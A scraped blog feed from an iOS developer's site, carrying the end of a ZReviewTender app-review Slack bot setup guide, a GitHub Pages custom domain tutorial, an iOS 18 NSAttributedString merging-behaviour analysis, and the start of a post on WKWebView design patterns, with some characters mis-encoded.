init ZReviewTender Action to complete: If you encounter ‚ùå Error: please recheck whether the previously mentioned Github Actions permission settings are correct.After successful initialization, two new directories will appear on the Repo homepage:Certificate files required for upload: Enter the /config directory Top right corner ‚ÄúAdd file‚Äù -&gt; ‚ÄúUpload files‚Äù Upload the saved GCP Service Account XXXX-XXXX.json (for Android) along with the App Store Connect saved AuthKey_XXXXXXXXXX.p8 (for iOS). Wait for the upload to complete. Select ‚ÄúCommit directly to the main branch.‚Äù Click ‚ÄúCommit changes.‚Äù Set up Apple (iOS): Go to the config/ directory and click the apple.yml file Click the top right corner ‚ÄúüñäÔ∏è Edit‚ÄùEdit apple.yml, paste the following content, and fill in the information noted in the previous steps:platform: 'apple'appStoreConnectP8PrivateKeyFilePath: './config/AuthKey_XXXXXXXXXX.p8' # APPLE STORE CONNECT API PRIVATE .p8 KEY File PathappStoreConnectP8PrivateKeyID: 'Private Key ID' # APPLE STORE CONNECT API PRIVATE KEY IDappStoreConnectIssueID: 'Issuer ID' # APPLE STORE CONNECT ISSUE IDappID: 'App ID' # APP IDprocessors: - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review messages in one Slack message. slackBotToken: \"Slack App Bot User OAuth Token\" # Slack Bot Token, send Slack messages through Slack Bot. slackBotTargetChannel: \"Target Channel ID\" # Slack Bot Token, send Slack messages through Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack Incoming WebHook URL, send Slack messages through Incoming WebHook, not recommended, deprecated. appStoreConnectP8PrivateKeyFilePath :Enter ./config/AuthKey_XXXXXXXXXX.p8 (Step 2. The saved AuthKey_XXXXXXXXXX.p8 file name from App Store Connect) appStoreConnectP8PrivateKeyID : Step 2. The Private Key ID noted from App Store Connect appStoreConnectIssueID : Step 2. The Issuer ID recorded from App Store Connect appID : Step 2. The target App‚Äôs App ID recorded from App Store Connect for data retrieval slackBotToken : Enter the Slack App Bot User OAuth Token noted in Step 1. slackBotTargetChannel : Enter the Channel ID noted in Step 1 for the destination channel After editing, click ‚ÄúCommit changes‚Ä¶‚Äù at the top right corner. Select ‚ÄúCommit directly to the main branch‚Äù Click ‚ÄúCommit changes‚Äù Setting up Android: Go to the config/ directory and click on the android.yml file Click the ‚ÄúüñäÔ∏è Edit‚Äù button at the top right cornerEdit android.yml, paste the following content, and fill in the information noted from the previous steps:platform: 'android'packageName: 'Package Name' # Android App Package NamekeyFilePath: './config/XXXX-XXXX.json' # Google Android Publisher API Service Account Credential .json File PathplayConsoleDeveloperAccountID: 'Developer ID' # Google Console Developer Account IDplayConsoleAppID: 'App ID' # Google Console App IDprocessors:- SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review messages in 1 slack message. slackBotToken: \"Slack App Bot User OAuth Token\" # Slack Bot Token, send slack message through Slack Bot. slackBotTargetChannel: \"Target Channel ID\" # Slack Bot Token, send slack message through Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack Incoming WebHook URL, send slack message through Incoming WebHook, not recommended, deprecated. packageName : The Package Name obtained from Step 2 in the Google Play Console backend keyFilePath :Enter ./config/XXXX-XXXX.json (Step 2. The XXXX-XXXX.json Service Account key file name saved from GCP IAM) playConsoleDeveloperAccountID : Step 2. The Developer ID obtained from the Google Play Console backend playConsoleAppID : Step 2. The App ID obtained from the Google Play Console backend slackBotToken : Enter the Slack App Bot User OAuth Token noted in Step 1. slackBotTargetChannel : Enter the Channel ID noted in Step 1 to send messages to After editing, click ‚ÄúCommit changes‚Ä¶‚Äù at the top right corner. Select ‚ÄúCommit directly to the main branch‚Äù Click ‚ÄúCommit changes‚Äù Setup Complete! üöÄüöÄüöÄüöÄVerify if the setup is successful:We can run it manually once to confirm the settings are correct. Repo -&gt; Actions Select ‚ÄúZReviewTender‚Äù Select ‚ÄúRun workflow‚Äù Click ‚ÄúRun workflow‚Äù Refresh the page Wait for ReviewTender Action to complete:Verification Successful üéâüéâüéâüéâ If you see ‚ùå Error or the Slack Channel does not receive the startup message: please recheck if the previous configuration files are correct.Completed üéâüéâüéâNow you can rely on this free and reliable App review bot to stay updated on the latest user reviews at all times!Buy me coffee ‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏èhttps://www.paypal.com/ncp/payment/CMALMPT8UUTY2 If this project has helped you, please consider buying me a coffee. Thank you.Other SettingsAdd Filtering FunctionalityOnly forward reviews that meet the criteria. - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out (territory for Apple e.g. TWN) You only need to add the FilterProcessor setting in the processors section of /config/apple.yml or /config/android.yml.Adding Automatic Translation FeatureAutomatically translate reviews in languages other than yours using Google Cloud Translation API (may incur costs). Please first ensure that the GCP Project of the Service Account created in Step 2 has the ‚ÄúCloud Translation API‚Äù enabled The configurations for apple.yml and android.yml have some differences. apple.yml: - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't need it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: './config/XXXX-XXXX.json' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"TWN\",\"CHN\"] # Review origin Territory that you don't want to translate. (territory for Apple e.g. TWN) ./config/XXXX-XXXX.json (Step 2. The XXXX-XXXX.json Service Account key file name saved from GCP IAM)android.yml: - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't need it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: './config/XXXX-XXXX.json' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to which language googleTranslateTerritoriesExclude: [\"zh-Hant\",\"zh-Hans\"] # Review origin Territory (language) that you don't want to translate. (language for android e.g. zh-Hant, en) ./config/XXXX-XXXX.json (Step 2. The XXXX-XXXX.json Service Account key file name saved from GCP IAM)Complete Example:platform: 'android'packageName: '' # Android App Package NamekeyFilePath: '' # Google Android Publisher API Service Account Credential .json File PathplayConsoleDeveloperAccountID: '' # Google Console Developer Account IDplayConsoleAppID: '' # Google Console App IDprocessors: - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out (territory for Apple e.g. TWN) - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't need it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: '' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what language googleTranslateTerritoriesExclude: [\"zh-Hant\",\"zh-Hans\"] # Review origin territory (language) that you don't want to translate. (language for android e.g. zh-Hant, en) - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review created date timezone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review messages in 1 slack message. slackBotToken: \"\" # Slack Bot Token, send slack message through Slack Bot. slackBotTargetChannel: \"\" # Slack Bot Token, send slack message through Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack Incoming WebHook URL, send slack message through Incoming WebHook, not recommended, deprecated.After adjustments, save the .yml file following these steps: After editing, click ‚ÄúCommit changes‚Ä¶‚Äù at the top right corner. Select ‚ÄúCommit directly to the main branch‚Äù Click ‚ÄúCommit changes‚Äù Execution Parameter SettingsYou can edit the ZReviewTender.yml file to set the execution parameters. Repo -&gt; Actions Click ‚ÄúZReviewTender‚Äù Click on ZReviewTender.yml Click the top right corner ‚ÄúüñäÔ∏è Edit‚Äù name: ZReviewTenderon: workflow_dispatch: schedule: - cron: \"15 */6 * * *\" # check new review every 6 hours.jobs: ZReviewTender: runs-on: ubuntu-latest steps: - name: ZReviewTender Automatic Bot uses: ZhgChgLi/ZReviewTender@main with: command: '-r'Adjust Check Frequency (How Often to Crawl and Forward New Reviews?)Adjust the settings in cron: \"15 */6 * * *\".Parameters use Crontab notation. You can use the following website to generate your desired settings:https://crontab.guru/Adjust Execution ScriptAdjust the setting value in command: \"-r\". -r : Run both Android and Apple (iOS) review checks simultaneously -a : Run Apple (iOS) review check only -g : Only run Android review check Adjustment Completed: After editing, click ‚ÄúCommit changes‚Ä¶‚Äù at the top right corner Select ‚ÄúCommit directly to the main branch‚Äù Click ‚ÄúCommit changes‚Äù Temporarily Pause Checking Repo -&gt; Actions Select ‚ÄúZReviewTender‚Äù Click the ‚Äú‚Ä¶‚Äù on the right side Select ‚ÄúDisable workflow‚Äù Issue Reporting and Feature SuggestionsIf you have any feature suggestions, questions, or bugs, please create an Issue in the above Github Repo. Thank you.Advanced Usage and Development Story ZReviewTender ‚Äî Free and Open-Source App Reviews Monitoring Bot App Store Connect API Now Supports Reading and Managing Customer Reviews ZReviewsBot ‚Äî Slack App Review Notification Bot AppStore APP‚Äôs Reviews Slack Bot Stories If you have any questions or feedback, feel free to contact me . üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "GitHub Pages Custom Domain SetupÔΩúReplace github.io with Your Own Domain", "url": "/posts/zrealm-dev/github-pages-custom-domain-setup-replace-github-io-with-your-own-domain-483af5d93297/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, github-pages, github, domain-names, namecheap", "date": "2024-09-22 17:14:16 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Github Pages Custom Domain TutorialReplace the original github.io URL with you...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Github Pages Custom Domain TutorialReplace the original github.io URL with your own domain name.About Github PagesGithub Pages is a free static site hosting service provided by Github. All Github Free accounts can use it directly for Public Repos, while Private Repos require a paid Github account upgrade.ZhgChgLiZhgChgLi iOS Developer eager to learn, teaching and learning together, loves movies/TV shows/western music/sports/life zhgchg.li My Jekyll Blog Deployed with Github Pages Seamless Migration from Medium to Github Pages ‚û°Ô∏è‚û°Ô∏è‚û°Ô∏è Limitations Only static file resources can be stored: HTML, CSS, JavaScript, font files, image files, PDF, audio files, text files, etc. Maximum website (Repo) size: 1 GBThis is likely a soft limit because my Github Pages Jekyll Repo is already nearly 5 GB. Longest Deployment Time: 10 minutes Maximum deployments per hour: 10 times (soft limit) Monthly Data Limit: 100 GB (soft limit) Too many requests may result in an HTTP 429 response. ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏èIf you only want to learn about Github Pages custom domain setup, please continue reading below.Github Pages Tutorial: Build a Personal Website with ChatGPT Without Coding SkillsThe following is an example for beginners with no programming or Git experience.1. Register and Log in to Github: https://github.com/ After logging into Github, select the ‚Äú+‚Äù icon at the top right -&gt; ‚ÄúNew repository‚Äù2. Enter Repo Name and Settings Repository name: your-username.github.io Public: Public project Add a README file: Convenient for creating and directly using GitHub Web to add files afterward Create repository Each account or organization can only create one main Github Pages repo named your-username.github.io. Other repos deployed to Github Pages will have URLs like your-username.github.io/RepoName, for example: your-username/your-username.github.io Repo -&gt; your-username.github.io yourusername/mywebdemo Repo -&gt; yourusername.github.io/mywebdemo If it is not a main GitHub Pages repo named youraccount.github.io, you need to go to Settings and configure Pages to enable GitHub Pages:For example, my repo zhgchgli0718/testgithubpage also wants to have a Github Pages site. Settings -&gt; Pages -&gt; Branch -&gt; Select main/root -&gt; Save Completed 3. Create Your Homepage .html File Click the green ‚ÄúCode‚Äù button at the top right corner of the Repo homepage Select ‚Äú+ Create new file‚Äù 4. Use ChatGPT to Help Generate Your Page .html Files Here is the simplest prompt: Generate a cyberpunk-style welcome page (.html)5. Paste .html Back to Github Repo File File name: Enter index.html Edit: Paste the .html content generated by ChatGPT. You can use ChatGPT to adjust the HTML as needed or edit the HTML content directly here. Click the top right corner ‚ÄúCommit changes‚Ä¶‚Äù Choose ‚ÄúCommit directly to the main branch‚Äù‚ÄîUploading resource files (e.g., images): Similarly, click ‚ÄúAdd file‚Äù and select ‚ÄúUpload files‚Äù Drag or select files, then wait for the upload to complete Click ‚ÄúCommit changes‚Äù Completed 6. Waiting for DeploymentAs mentioned earlier, Github Pages requires deployment; it won‚Äôt appear just by saving files. We can click on the ‚ÄúActions‚Äù tab at the top of the Repo to check the deployment progress. When the orange light üü† turns into a green checkmark ‚úÖ, it means the deployment is complete.7. Check the Resultshttps://zhgchgli0718.github.io/ Go to: https://your-username.github.io to see the resultsGithub Pages Custom Domain TutorialNext is the main point of this article: GitHub Pages custom domains. As mentioned earlier, by default, we can only use your-username.github.io as the main domain for your static website; other repositories can only be accessed via /path and cannot create a second *.github.io domain.But the great thing about Github Pages is that it offers a custom domain feature. ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è The purchased domain can also be used for: Medium custom domain feature. For example, my domain: 1. https://zhgchg.li -&gt; Used in Github Pages Jekyll Blog 2. https://blog.zhgchg.li -&gt; Used on my Medium page1. Purchase &amp; Acquire Domain by Namecheap (Established Domain Provider)First, go to the Namecheap official homepage and search for your preferred domain name:Search results obtained:The button on the right showing ‚ÄúAdd To Cart‚Äù means the domain name is still available for registration and can be added to the shopping cart for purchase.If the button on the right shows ‚ÄúMake offer‚Äù or ‚ÄúTaken,‚Äù it means the domain has already been registered. Please choose a different extension or try another domain name:After adding to the cart, click the ‚ÄúCheckout‚Äù button below.Enter the order confirmation page: Domain Registration: Here you can choose AUTO-RENEW for automatic yearly renewal, or select a one-time purchase for a set number of years. WhoisGuard: Since domain information is publicly available for anyone to query (registration date, expiration date, registrant, contact details), this feature lets you replace the registrant and contact info with Namecheap‚Äôs details instead of showing your personal info, helping to prevent spam.(This feature may require a fee for some extensions; if free, just use it!) Extract some whois information results for google.com, available here. PremiumDNS: We know a domain name is like an address plate, meaning people look at the plate to find the location. This feature provides a more stable and secure ‚Äúlocation finding‚Äù function. I think it‚Äôs unnecessary unless it‚Äôs a high-traffic e-commerce site where no errors are allowed.After entering your credit card information, click ‚ÄúConfirm Order‚ÄùThe purchase was successful afterward!You will receive an order detail email.2. Domain Setup by NamecheapGo to Account -&gt; Dashboard:Find the domain you want to set up -&gt; Click ‚ÄúManage‚Äù on the right:Confirm Domain -&gt; NAMESERVERS -&gt; Select ‚ÄúNamecheap BasicDNS‚Äù:Switch to ‚ÄúAdvanced DNS‚Äù -&gt; Add A Record: Click ‚ÄúADD NEW RECORD‚Äù Type select ‚ÄúA Record‚Äù Host inputs ‚Äú@‚Äù Enter values in order: 185.199.108.153185.199.109.153185.199.110.153185.199.111.153Four records. Click ‚Äú‚úîÔ∏è‚Äù to save the settings after each entry. Completed. 3. Add a CNAME Record According to the Desired Github Pages Repo: Click ‚ÄúADD NEW RECORD‚Äù Type select ‚ÄúCNAME Record‚Äù Host input: enter the desired subdomain. If you want a primary domain, enter ‚Äúwww‚Äù. Value input: yourusername.github.io 4. Back to Github Repo Settings Github Repo -&gt; Settings -&gt; Pages Custom domain: Enter your domain (omit www. if present) Click Save You can check the option to enforce HTTPS to enhance access security.Waiting for DNS Check‚Ä¶ Usually confirmed within five minutes, but due to DNS mechanisms, it may take up to 72 hours for the settings to take effect. If you are sure the steps are correct but confirmation keeps failing, try again after a few days.Setup Successful!Go to your domain verification results:Success! üéâüéâüéâ Now we no longer need to use the old https://yourusername.github.io to access your Github Pages. You can directly use https://yourdomain to visit it! Other repos‚Äô GitHub Pages can also be accessed via https://your-domain/Repo-name.Other ArticlesMedium Custom DomainMedium Custom DomainSeamless Migration from Medium to Github PagesPainless Migration from Medium to Github PagesIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS 18 NSAttributedString Attributes Range MergingÔΩúEquatable Behavior Change Explained", "url": "/posts/zrealm-dev/ios-18-nsattributedstring-attributes-range-merging-equatable-behavior-change-explained-9e43897d99fc/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, nsattributedstring, ios-18, ios, swift", "date": "2024-09-20 21:03:42 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS ‚â• 18 NSAttributedString attributes Range merging behavior changeStarting f...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS ‚â• 18 NSAttributedString attributes Range merging behavior changeStarting from iOS ‚â• 18, NSAttributedString attributes Range merging will refer to Equatable.Photo by C MCause of the ProblemAfter the release of iOS 18 on September 17, 2024, a developer reported that the open-source project ZMarkupParser crashes when parsing certain HTML on iOS 18.Seeing this issue is a bit confusing because the program worked fine before. It only started crashing with iOS 18, which is unusual. It should be caused by some changes in the underlying Foundation of iOS 18.Crash TraceTrace Code pinpointed the crash issue to iterating over .breaklinePlaceholder attributes and performing deletion operations on the Range:mutableAttributedString.enumerateAttribute(.breaklinePlaceholder, in: NSMakeRange(0, NSMakeRange(0, mutableAttributedString.string.utf16.count))) { value, range, _ in // ...if condition... // mutableAttributedString.deleteCharacters(in: preRange) // ...if condition... // mutableAttributedString.deleteCharacters(in: range)}.breaklinePlaceholder is a custom NSAttributedString.Key I created to mark HTML tag information, optimizing the use of line break characters:struct BreaklinePlaceholder: OptionSet { let rawValue: Int static let tagBoundaryPrefix = BreaklinePlaceholder(rawValue: 1) static let tagBoundarySuffix = BreaklinePlaceholder(rawValue: 2) static let breaklineTag = BreaklinePlaceholder(rawValue: 3)}extension NSAttributedString.Key { static let breaklinePlaceholder: NSAttributedString.Key = .init(\"breaklinePlaceholder\")} But the core issue is not here because before iOS 17, inputting a mutableAttributedString did not cause any problems when performing the above operations; this means the input data content has changed in iOS 18.NSAttributedString attributes: [NSAttributedString.Key: Any?]Before diving deeper into the issue, let‚Äôs first introduce the merging mechanism of NSAttributedString attributes.NSAttributedString attributes will automatically compare adjacent Range Attributes objects with the same .key and merge them if they are identical. For example:let mutableAttributedString = NSMutableAttributedString(string: \"\", attributes: nil)mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.font: UIFont.systemFont(ofSize: 14)]))mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.font: UIFont.systemFont(ofSize: 14)]))mutableAttributedString.append(NSAttributedString(string: \"&lt;p&gt;\", attributes: [.font: UIFont.systemFont(ofSize: 14)]))mutableAttributedString.append(NSAttributedString(string: \"Test\", attributes: [.font: UIFont.systemFont(ofSize: 12)]))Final Attributes Merge Result:&lt;div&gt;&lt;div&gt;&lt;p&gt;{ NSFont = \"&lt;UICTFont: 0x101d13400&gt; font-family: \\\".SFUI-Regular\\\"; font-weight: normal; font-style: normal; font-size: 14.00pt\";}Test{ NSFont = \"&lt;UICTFont: 0x101d13860&gt; font-family: \\\".SFUI-Regular\\\"; font-weight: normal; font-style: normal; font-size: 12.00pt\";}When using enumerateAttribute(.breaklinePlaceholder...), the following result is obtained:NSRange {0, 13}: &lt;UICTFont: 0x101d13400&gt; font-family: \".SFUI-Regular\"; font-weight: normal; font-style: normal; font-size: 14.00ptNSRange {13, 4}: &lt;UICTFont: 0x101d13860&gt; font-family: \".SFUI-Regular\"; font-weight: normal; font-style: normal; font-size: 12.00ptNSAttributedString attributes Merging ‚Äî Underlying Implementation SpeculationIt is inferred that the underlying implementation uses Set&lt;Hashable&gt; as the container for Attributes, which automatically excludes duplicate Attribute objects.However, for ease of use, the NSAttributedString attributes: [NSAttributedString.Key: Any?] value object is declared as type Any?, without restricting it to Hashable.It is therefore speculated that the system conforms to as? Hashable at the underlying level and then uses a Set to manage object merging. The difference in the iOS ‚â• 18 adjustment this time is likely due to the underlying implementation here.The following is an example using our custom .breaklinePlaceholder Attributes:struct BreaklinePlaceholder: Equatable { let rawValue: Int static let tagBoundaryPrefix = BreaklinePlaceholder(rawValue: 1) static let tagBoundarySuffix = BreaklinePlaceholder(rawValue: 2) static let breaklineTag = BreaklinePlaceholder(rawValue: 3)}extension NSAttributedString.Key { static let breaklinePlaceholder: NSAttributedString.Key = .init(\"breaklinePlaceholder\")}//let mutableAttributedString = NSMutableAttributedString(string: \"\", attributes: nil)mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.breaklinePlaceholder: NSAttributedString.Key.BreaklinePlaceholder.tagBoundaryPrefix]))mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.breaklinePlaceholder: NSAttributedString.Key.BreaklinePlaceholder.tagBoundaryPrefix]))mutableAttributedString.append(NSAttributedString(string: \"&lt;p&gt;\", attributes: [.breaklinePlaceholder: NSAttributedString.Key.BreaklinePlaceholder.tagBoundaryPrefix]))mutableAttributedString.append(NSAttributedString(string: \"Test\", attributes: nil))Before iOS 17, the following Attributes merge result will be obtained:&lt;div&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}&lt;div&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}&lt;p&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}Test{}iOS ‚â• 18 will get the following merged Attributes results:&lt;div&gt;&lt;div&gt;&lt;p&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}Test{} You can see that the same code produces different results on different iOS versions, which ultimately causes the subsequent enumerateAttribute(.breaklinePlaceholder..) processing logic to behave unexpectedly and leads to a crash.‚≠êÔ∏è iOS ‚â• 18 NSAttributedString attributes: [NSAttributedString.Key: Any?] will also consider Equatable ==‚≠êÔ∏èComparison of iOS 17/18 Results with or without Implementing Equatable/Hashable ‚≠êÔ∏è‚≠êÔ∏è iOS ‚â• 18 will refer more to Equatable, while iOS ‚â§ 17 will not.‚≠êÔ∏è‚≠êÔ∏èCombining the above, the value object of NSAttributedString attributes: [NSAttributedString.Key: Any?] is declared as type Any?. Based on observations, iOS ‚â• 18 first checks equality using Equatable, then uses a Hashable Set to manage object merging.Conclusion NSAttributedString attributes: [NSAttributedString.Key: Any?] When merging Range Attributes, iOS ‚â• 18 additionally considers Equatable, which is different from before.Additionally, starting from iOS 18, if you only declare Equatable, XCode Console will also output a Warning: Obj-C -hash invoked on a Swift value of type BreaklinePlaceholder that is Equatable but not Hashable; this can lead to severe performance problems.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Design Patterns in WKWebView: Builder, Strategy & Chain of Responsibility Explained", "url": "/posts/kkday-tech-blog/design-patterns-in-wkwebview-builder-strategy-chain-of-responsibility-explained-f4b02ee342a4/", "categories": "KKday Tech Blog", "tags": "english, ai-translation, ios-app-development, design-patterns, chain-of-responsibility, builder-pattern, strategy-pattern", "date": "2024-09-06 13:47:47 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Practical Application Record of Design Patterns‚ÄîIn WKWebView with Builder, Str...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Practical Application Record of Design Patterns‚ÄîIn WKWebView with Builder, Strategy &amp; Chain of Responsibility PatternDesign Patterns Used When Encapsulating iOS WKWebView (Strategy, Chain of Responsibility, Builder).Photo by Dean PughAbout Design PatternsBefore discussing Design Patterns, it‚Äôs important to mention that the classic GoF 23 design patterns were published over 30 years ago (1994). With changes in tools, languages, and software development approaches, the landscape has evolved significantly. Many new design patterns have since emerged in different fields. Design Patterns are neither a cure-all nor the only solution. They serve more as a ‚Äúlanguage shorthand‚Äù to apply the right pattern in the right context, reducing collaboration barriers during development. For example, applying the Strategy Pattern here allows future maintenance and extension to follow the Strategy Pattern structure directly. Most design patterns also provide good decoupling, which greatly benefits extensibility and testability.Mindset for Using Design Patterns Not the only solution Not a cure-all Do not apply rigidly; choose the appropriate design pattern based on the type of problem to solve (creation? behavior? structure?) and the purpose. Do not drastically alter the code. Major changes can cause confusion for future maintainers. Just like language, everyone calls Apple ‚ÄúApple.‚Äù If you define it as ‚ÄúBanana,‚Äù it becomes an additional development cost that requires special knowledge. Avoid using keywords whenever possible. For example, the Factory Pattern is commonly named XXXFactory. If it is not a factory pattern, this naming keyword should not be used. Be cautious when creating your own patterns. Although there are only 23 classic ones, many new patterns have emerged through years of evolution across various fields. You can first refer to online resources to find suitable patterns (after all, three heads are better than one). If none fit, then propose new design patterns and try to publish them for review and adjustment by people from different fields and contexts. Code is ultimately written for people to maintain. As long as it is easy to maintain and extend, using design patterns is not always necessary. The team must have a consensus on Design Patterns before using them. Design Patterns can be combined with other Design Patterns for advanced techniques. Getting started with Design Patterns requires continuous practical experience to develop a sharper sense of which scenarios are suitable or unsuitable for their application. Helpful Tool ChatGPTSince the arrival of ChatGPT, learning practical applications of Design Patterns has become easier. Just describe your problem clearly and ask which design patterns suit the scenario. It can provide several possible patterns along with explanations. Although not every answer is perfect, it at least offers feasible directions. We only need to explore these patterns further in the context of our own practical issues, and we can eventually find a good solution!Practical Use Cases of WKWebView Design PatternsThis practical application of Design Patterns focuses on consolidating the WKWebView object features within the current codebase and applying Design Patterns at several suitable logical abstraction points while developing a unified WKWebView component. This is a record of insights and experiences shared. The complete demo project code will be attached at the end of the article.Original Non-Abstract Writing Styleclass WKWebViewController: UIViewController { // MARK - Define some variables and switches for injecting features during external init... // Simulate business logic: switch to match special paths to open native pages let noNeedNativePresent: Bool // Simulate business logic: switch for DeeplinkManager check let deeplinkCheck: Bool // Simulate business logic: is it the home page? let isHomePage: Bool // Simulate business logic: WKUserScript scripts to inject into WKWebView let userScripts: [WKUserScript] // Simulate business logic: WKScriptMessageHandler scripts to inject into WKWebView let scriptMessageHandlers: [String: WKScriptMessageHandler] // Allow overriding ViewController title from WebView title let overrideTitleFromWebView: Bool let url: URL // ... }// ...extension OldWKWebViewController: WKNavigationDelegate { // MARK - iOS WKWebView navigationAction Delegate, used to decide how to handle the upcoming link // Must call decisionHandler(.allow) or decisionHandler(.cancel) at the end // decisionHandler(.cancel) will stop loading the upcoming page // Here simulates different logic based on different variables and switches: func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { guard let url = navigationAction.request.url else { decisionHandler(.allow) return } // Simulate business logic: WebViewController deeplinkCheck == true (means need to check with DeepLinkManager and open page) if deeplinkCheck { print(\"DeepLinkManager.open(\\(url.absoluteString)\") // Simulate DeepLinkManager logic, if URL can be opened successfully, open it and end the process. // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return // } } // Simulate business logic: WebViewController isHomePage == true (means it is home page) &amp; WebView is browsing home page, then switch TabBar Index if isHomePage { if url.absoluteString == \"https://zhgchg.li\" { print(\"Switch UITabBarController to Index 0\") decisionHandler(.cancel) } } // Simulate business logic: WebViewController noNeedNativePresent == false (means need to match special paths to open native pages) if !noNeedNativePresent { if url.pathComponents.count &gt;= 3 { if url.pathComponents[1] == \"product\" { // match http://zhgchg.li/product/1234 let id = url.pathComponents[2] print(\"Present ProductViewController(\\(id)\") decisionHandler(.cancel) } else if url.pathComponents[1] == \"shop\" { // match http://zhgchg.li/shop/1234 let id = url.pathComponents[2] print(\"Present ShopViewController(\\(id)\") decisionHandler(.cancel) } // more... } } decisionHandler(.allow) }}// ...Question Setting variables and toggles openly within a class makes it unclear which are meant for configuration. Directly exposing the WKUserScript variable externally is not recommended; we want to control the injected JS and only allow specific behaviors to be injected. 